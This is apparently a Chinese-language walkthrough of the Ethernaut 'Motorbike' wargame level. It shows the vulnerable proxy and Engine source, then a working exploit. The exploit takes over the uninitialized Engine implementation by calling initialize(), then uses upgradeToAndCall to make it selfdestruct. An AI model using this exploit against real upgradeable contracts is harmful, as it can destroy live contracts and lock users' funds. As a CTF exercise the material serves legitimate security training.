### 第二十五题 Motorbike
### 题目
ethernaut 的摩托车采用全新的可升级引擎实现。你能自毁 (selfdestruct) 它的引擎并使摩托车无法使用吗？
### 提示
- EIP-1967
- UUPS upgradeable pattern
- Initializable contract
### 源码
```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    //结构体AddressSlot，包含一个地址类型的成员value
    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    // 使用指定的逻辑合约地址_logic初始化可升级代理
    constructor(address _logic) public {
        // 确保_logic是一个合约地址
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        // 调用_logic合约的initialize函数
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }
    // 将当前调用委托给implementation地址
    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        // 使用内联汇编进行委托调用
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
     // 回退函数，将调用委托给_implementation()返回的地址
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    // 返回位于slot位置的AddressSlot结构体
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    // 将代理的实现升级到newImplementation，并执行函数调用
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        // 授权升级
        _authorizeUpgrade();
        // 执行升级并调用
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    // 限制为升级者角色
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    // 执行实现升级，并进行安全检查和额外的设置调用
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // 设置新的实现地址
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    // 在EIP1967实现槽中存储一个新的地址
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        // 将newImplementation地址存储在_IMPLEMENTATION_SLOT位置
        r.value = newImplementation;
    }
}
```
### 解题思路&过程
1. 读一下Engine合约的地址
``slotaddr = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
await web3.eth.getStorageAt(contract.address,slotaddr)``
2. 外部调用Engine合约的initialize()函数，来让Engine合约的upgrader变成我们的地址。
``(bool success,) = newImplementation.delegatecall(data);``
3. 攻击代码
```solidity
//SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract attack{

    address target;

    constructor(address _addr)public{
        target=_addr;
    }
    function step1beupgrader()public{
        bool succ;
        (succ,)=target.call(abi.encodeWithSignature("initialize()"));
        require(succ,"step1 failed!");
    }

    function step2exp()public{
        bool succ;
        DestructContract destructContract = new DestructContract();
        (succ,)=target.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(destructContract),abi.encodeWithSignature("sakai()")));
        require(succ,"step2 failed!");
    }
}

contract DestructContract{
    function sakai() external{
        selfdestruct(msg.sender);
    }
}
```
4. 执行step1beupgrade函数后，再去读Engine合约的storage值
``await web3.eth.getStorageAt(engineaddr, 0)
await web3.eth.getStorageAt(engineaddr, 1)``
5. 然后执行step2exp，执行后查看Engine合约对应的地址，攻击完成
